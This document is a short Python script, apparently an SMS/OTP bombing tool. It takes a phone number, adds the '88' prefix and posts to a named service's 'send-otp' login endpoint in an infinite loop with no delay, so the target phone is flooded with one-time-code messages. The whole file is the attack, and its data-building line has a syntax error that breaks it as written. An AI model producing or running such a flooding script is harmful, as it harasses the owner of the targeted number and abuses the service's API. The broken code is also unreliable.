import requests
from requests.structures import CaseInsensitiveDict

number=str(input("Enter Number: "))

url = "https://api.bongo-solutions.com:443/auth/api/login/send-otp"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/json"

data = '{"operator":"all","msisdn":"88'+number'"}'


while 1:
	try:
		resp = requests.post(url, headers=headers, data=data)
		print(resp.text)
	except:
		print("error")
